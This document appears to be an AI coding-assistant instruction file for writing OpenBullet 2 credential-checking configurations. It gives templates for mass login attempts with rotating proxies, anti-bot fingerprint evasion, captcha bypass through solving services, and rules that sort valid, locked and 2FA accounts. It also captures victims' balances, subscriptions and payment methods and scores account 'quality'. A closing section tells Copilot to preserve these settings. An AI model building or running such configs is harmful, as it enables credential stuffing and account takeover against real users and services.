# OpenBullet Configuration Instructions

**Apply To**: `*.loli`, `*.opk`, OpenBullet configuration files

## Configuration File Types

### LoliCode (.loli files)

LoliCode is a custom scripting language for OpenBullet 2 configurations. It's a high-level, block-based language that compiles to C# code.

### OPK Files (.opk files)

OPK (OpenBullet Package) files are JSON-based configuration packages that include:
- Configuration metadata
- Settings and parameters
- LoliScript or LoliCode blocks
- Custom data structures

## General Configuration Standards

### Metadata

All configurations must include complete metadata:

```loli
METADATA
  NAME "Service Name - Feature Description"
  AUTHOR "legendhkek"
  CATEGORY "Service Category"
  VERSION "1.0.0"
  LAST_MODIFIED "YYYY-MM-DD"
  DESCRIPTION "Detailed description of what this config does"
  CPM 200-500  // Checks per minute
  BOTS 200-500  // Concurrent workers
END
```

### Performance Settings

Optimize for high throughput:

- **CPM (Checks Per Minute)**: 200-500 depending on API complexity
- **Bots**: 200-500 concurrent workers
- **Timeout**: 30-60 seconds for API requests
- **Retries**: 3-5 attempts with exponential backoff

### Proxy Configuration

Always support multiple proxy types:

```loli
SETTINGS
  ProxyType: "HTTP"  // HTTP, HTTPS, SOCKS4, SOCKS5
  RequiresProxies: true
  MaxProxiesPerBot: 1
  ProxyRotation: "RoundRobin"  // RoundRobin, Random, Sequential
  ProxyTimeout: 30
END
```

## Request Building

### HTTP Requests

Use proper HTTP methods and headers:

```loli
REQUEST GET "https://api.service.com/endpoint"
  HEADERS
    "User-Agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
    "Accept" => "application/json"
    "Accept-Language" => "en-US,en;q=0.9"
    "Accept-Encoding" => "gzip, deflate, br"
    "Connection" => "keep-alive"
    "Referer" => "https://www.service.com/"
    "Sec-Fetch-Dest" => "empty"
    "Sec-Fetch-Mode" => "cors"
    "Sec-Fetch-Site" => "same-site"
  END
END
```

### POST Requests with Data

```loli
REQUEST POST "https://api.service.com/login"
  HEADERS
    "Content-Type" => "application/json"
    "Origin" => "https://www.service.com"
  END
  CONTENT "{\"email\":\"<email>\",\"password\":\"<password>\"}"
  CONTENTTYPE "application/json"
END
```

## Data Parsing

### JSON Parsing

```loli
PARSE JSON "<response.content>" "$.data.token" -> VAR "authToken"
PARSE JSON "<response.content>" "$.data.user.email" -> VAR "userEmail"
PARSE JSON "<response.content>" "$.data.user.status" -> VAR "accountStatus"
```

### Regex Parsing

```loli
PARSE REGEX "<response.content>" "\"csrf\":\"([^\"]+)\"" -> VAR "csrfToken"
PARSE REGEX "<response.content>" "\"sessionId\":\"([^\"]+)\"" -> VAR "sessionId"
```

### LR (Left/Right) Parsing

```loli
PARSE LR "<response.content>" "\"token\":\"" "\"" -> VAR "token"
PARSE LR "<response.content>" "\"email\":\"" "\"" -> VAR "extractedEmail"
```

## Conditional Logic

### Success/Fail Conditions

```loli
// Check for success indicators
KEYCHECK
  KEYCHAIN Success OR
    KEY "<response.content>" Contains "\"success\":true"
    KEY "<response.content>" Contains "\"authenticated\":true"
    KEY "<accountStatus>" EqualTo "active"
  END
END

// Check for failure conditions
KEYCHECK
  KEYCHAIN Failure OR
    KEY "<response.content>" Contains "\"error\":"
    KEY "<response.content>" Contains "invalid credentials"
    KEY "<response.statusCode>" EqualTo "401"
  END
END
```

### Ban Conditions

```loli
KEYCHECK
  KEYCHAIN Ban OR
    KEY "<response.content>" Contains "ip blocked"
    KEY "<response.content>" Contains "rate limit exceeded"
    KEY "<response.content>" Contains "account suspended"
    KEY "<response.statusCode>" EqualTo "429"
  END
END
```

### Retry Conditions

```loli
KEYCHECK
  KEYCHAIN Retry OR
    KEY "<response.statusCode>" EqualTo "500"
    KEY "<response.statusCode>" EqualTo "503"
    KEY "<response.content>" Contains "try again later"
  END
END
```

## Advanced Features

### Anti-Bot Evasion

Implement realistic browser behavior:

```loli
// Random delays to simulate human interaction
DELAY RandomInt(500, 3000)

// Randomize User-Agent
SET "userAgent" = RandomUA()

// Device fingerprinting
SET "deviceId" = RandomString(32, "0123456789abcdef")
SET "canvasFingerprint" = Hash(RandomString(16), "SHA256")
SET "webglFingerprint" = Hash(RandomString(16), "MD5")
```

### Session Management

```loli
// Store session cookies
COOKIE GET "sessionid" -> VAR "sessionId"
COOKIE GET "csrftoken" -> VAR "csrfToken"

// Reuse session for subsequent requests
COOKIE SET "sessionid" "<sessionId>"
COOKIE SET "csrftoken" "<csrfToken>"
```

### TLS Configuration

For OPK files (JSON format):

```json
{
  "settings": {
    "tlsSettings": {
      "tlsVersion": "TLS_1_3",
      "cipherSuites": [
        "TLS_AES_128_GCM_SHA256",
        "TLS_AES_256_GCM_SHA384",
        "TLS_CHACHA20_POLY1305_SHA256"
      ],
      "signatureAlgorithms": [
        "ecdsa_secp256r1_sha256",
        "rsa_pss_rsae_sha256",
        "rsa_pkcs1_sha256"
      ],
      "supportedGroups": ["x25519", "secp256r1", "secp384r1"],
      "alpnProtocols": ["h2", "http/1.1"],
      "enableOCSPStapling": true,
      "enableSNI": true,
      "enableSessionTickets": true
    }
  }
}
```

## Data Capture

### Capture Account Data

```loli
CAPTURE "email" => "<userEmail>"
CAPTURE "status" => "<accountStatus>"
CAPTURE "subscription" => "<subscriptionType>"
CAPTURE "balance" => "<accountBalance>"
CAPTURE "vip_level" => "<vipLevel>"
CAPTURE "2fa_enabled" => "<twoFactorEnabled>"
```

### Account Quality Scoring

Implement quality scoring logic:

```loli
// Initialize score
SET "qualityScore" = 0

// Add points for active subscription
IF "<subscriptionStatus>" EqualTo "active"
  SET "qualityScore" = Add("<qualityScore>", 3)
END

// Add points for premium account
IF "<accountType>" EqualTo "premium"
  SET "qualityScore" = Add("<qualityScore>", 2)
END

// Add points for payment method
IF "<paymentMethod>" NotEqualTo ""
  SET "qualityScore" = Add("<qualityScore>", 2)
END

CAPTURE "quality_score" => "<qualityScore>"
```

## Error Handling

### Comprehensive Error Detection

```loli
// Invalid credentials
KEYCHECK
  KEYCHAIN Failure OR
    KEY "<response.content>" Contains "invalid_credentials"
    KEY "<response.content>" Contains "incorrect password"
    KEY "<response.content>" Contains "user not found"
  END
END

// Account locked/suspended
KEYCHECK
  KEYCHAIN Custom "LOCKED" OR
    KEY "<response.content>" Contains "account locked"
    KEY "<response.content>" Contains "security lock"
  END
END

KEYCHECK
  KEYCHAIN Custom "SUSPENDED" OR
    KEY "<response.content>" Contains "account suspended"
    KEY "<response.content>" Contains "account banned"
  END
END

// 2FA required
KEYCHECK
  KEYCHAIN Custom "2FA_REQUIRED" OR
    KEY "<response.content>" Contains "two_factor_required"
    KEY "<response.content>" Contains "verify_code"
  END
END

// Rate limited
KEYCHECK
  KEYCHAIN Retry OR
    KEY "<response.content>" Contains "rate_limit"
    KEY "<response.content>" Contains "too many requests"
    KEY "<response.statusCode>" EqualTo "429"
  END
END
```

## Captcha Integration

### Multiple Captcha Services

```loli
// Check if captcha is required
IF "<response.content>" Contains "captcha"
  
  // Solve captcha based on configured service
  IF "<captchaService>" EqualTo "2captcha"
    CAPTCHA Solve2Captcha "<siteKey>" "<pageUrl>" -> VAR "captchaSolution"
  ELSE IF "<captchaService>" EqualTo "anticaptcha"
    CAPTCHA SolveAntiCaptcha "<siteKey>" "<pageUrl>" -> VAR "captchaSolution"
  ELSE IF "<captchaService>" EqualTo "capmonster"
    CAPTCHA SolveCapMonster "<siteKey>" "<pageUrl>" -> VAR "captchaSolution"
  END
  
  // Retry with captcha solution
  REQUEST POST "https://api.service.com/verify"
    CONTENT "{\"captcha\":\"<captchaSolution>\"}"
  END
END
```

## Testing and Validation

### Pre-Release Checklist

Before committing a new configuration:

1. **Test with sample data**: Use 10-20 test accounts
2. **Verify proxy support**: Test with HTTP, HTTPS, SOCKS4, SOCKS5
3. **Check error handling**: Test with invalid credentials, blocked IPs, rate limits
4. **Validate data capture**: Ensure all expected fields are captured
5. **Performance test**: Verify CPM and bot count settings are achievable
6. **Documentation**: Update README with configuration details

### Common Issues

**Low success rate**:
- Check if API endpoints have changed
- Verify request headers match real browser requests
- Ensure cookies and session management are working
- Test proxy quality

**Rate limiting**:
- Reduce CPM and bot count
- Implement retry logic with exponential backoff
- Use higher quality proxies

**No data captured**:
- Verify JSON/Regex parsing patterns are correct
- Check if API response format has changed
- Ensure capture statements are executed after successful auth

## Documentation Requirements

Each configuration must have:

1. **README Section**: Brief overview, features, CPM/bots settings
2. **Usage Guide**: Step-by-step setup instructions (e.g., `SERVICE_USAGE_GUIDE.md`)
3. **Technical Specs**: Detailed technical documentation (e.g., `SERVICE_TECHNICAL_SPECS.md`)

### README Section Template

```markdown
### Service Name - Feature Description
**File:** `SERVICE.COM.loli` or `service.com.opk`
**Version:** 1.0.0
**Category:** Category Name
**Created:** YYYY-MM-DD

Description of what the config does:
- **CPM**: 200-500 checks per minute
- **Bots**: 200-500 concurrent workers
- **Method**: API/Browser description
- **Data Capture**: List of captured fields
- **Format**: LoliCode/LoliScript or OPK

**Features:**
- Feature 1
- Feature 2
- Feature 3
```

## Best Practices

1. **Security**: Never hardcode API keys or sensitive data
2. **Performance**: Optimize request patterns and minimize delays
3. **Reliability**: Implement robust error handling and retry logic
4. **Maintainability**: Use clear variable names and comments
5. **Testing**: Always test with real proxies and sample data
6. **Documentation**: Keep README and technical specs up to date
7. **Versioning**: Increment version numbers for significant changes

## OPK File Structure

For OPK format configurations:

```json
{
  "name": "Service Name Checker",
  "author": "legendhkek",
  "version": "1.0.0",
  "category": "Category",
  "description": "Detailed description",
  "settings": {
    "general": {
      "cpm": 200,
      "bots": 200,
      "timeout": 30,
      "retries": 3
    },
    "proxy": {
      "required": true,
      "type": "HTTP",
      "rotation": "RoundRobin"
    },
    "advanced": {
      "antiBot": true,
      "sessionManagement": true,
      "fingerprinting": true
    }
  },
  "script": [
    {
      "type": "REQUEST",
      "method": "GET",
      "url": "https://api.service.com/endpoint",
      "headers": {}
    }
  ]
}
```

## Notes for Copilot

- LoliCode/LoliScript is a domain-specific language - treat it as structured text
- OPK files are JSON-based but contain custom configuration schemas
- Always preserve performance optimizations (CPM, bots, threading)
- Test configurations with real proxies before committing
- Maintain backwards compatibility with OpenBullet 2
- Keep detailed documentation for all configuration changes
